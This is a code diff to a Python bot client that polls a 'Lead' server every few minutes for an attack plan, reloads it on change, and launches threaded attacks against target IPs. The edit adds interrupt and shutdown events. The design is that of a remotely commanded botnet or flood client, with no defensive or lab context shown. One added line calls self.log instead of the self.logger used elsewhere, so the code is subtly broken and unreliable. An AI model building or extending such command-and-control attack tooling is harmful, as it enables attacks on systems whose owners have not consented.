@@ -53,8 +53,9 @@ class Bot:
     def __init__(self, cfg: BotConfig) -> None:
         self.cfg       = cfg
         self.logger    = self._make_logger()
-        self.plan_hash = ""              # filled after first download
-        self.stop_evt  = threading.Event()
+        self.plan_hash = ""              # filled after first connection to Lead
+        self.stop_evt  = threading.Event()    # global stop (Ctrl-C, after plan)
+        self.attack_evt = threading.Event()   # interrupt running attacks
 
     # ------------------------------- public -------------------------------- #
     def run(self) -> None:
@@ -112,12 +113,16 @@ class Bot:
             interval = random.randint(180, 300)   # 3–5 min
             if self.stop_evt.wait(interval):
                 break                             # stop requested
+
             try:
                 new_hash = self._fetch_plan_hash()
                 if new_hash != self.plan_hash:
-                    self.logger.info("Plan changed - downloading update")
+                    self.log.info("Plan update detected - reloading")
+                    # interrupt running attacks
+                    self.attack_evt.set()
                     raw = self._fetch_plan()
                     self.plan_hash = Plan.sha256_json(raw)
+                    self.attack_evt.clear()
                     self._execute_plan(Plan.from_json(raw))
                 else:
                     self.logger.debug("Plan unchanged")
@@ -128,6 +133,8 @@ class Bot:
     def _execute_plan(self, plan: Plan) -> None:
             """Run each attack in order"""
             for atk in plan.attack_objs:
+                if self.stop_evt.is_set():
+                    break # global shutdown requested
                 self.logger.info("Starting %s on %s with %d thread(s)",type(atk).__name__,atk.target_ip,atk.threads,)
                 workers: list[threading.Thread] = []
                 def _worker() -> None:
@@ -149,7 +156,8 @@ class Bot:
                     t.join()
 
                 self.logger.info("Attack %s on %s completed", type(atk).__name__, atk.target_ip)
-
+            
+            self.stop_evt.set() # All attacks in current plan done – request shutdown
             if self.cfg.debug:
                 print("All attacks finished", flush=True)
 
